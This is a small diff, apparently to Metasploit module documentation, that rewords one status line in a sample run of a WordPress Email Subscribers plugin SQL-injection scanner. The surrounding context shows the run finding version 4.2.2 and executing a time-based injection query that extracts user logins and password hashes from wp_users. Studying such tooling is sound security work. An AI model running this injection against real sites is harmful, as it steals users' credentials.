@@ -46,7 +46,7 @@ msf6 auxiliary(scanner/http/wp_email_sub_news_sqli) > run
 
 [*] Checking /wp-content/plugins/email-subscribers/readme.txt
 [*] Found version 4.2.2 in the plugin
-[+] Vulnerable version detected
+[+] Vulnerable version of Email Subscribers and Newsletter detected
 [*] {SQLi} Executing (select group_concat(yKaoA) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) yKaoA from wp_users limit 3) adO)
 [*] {SQLi} Time-based injection: expecting output of length 124
 [+] wp_users
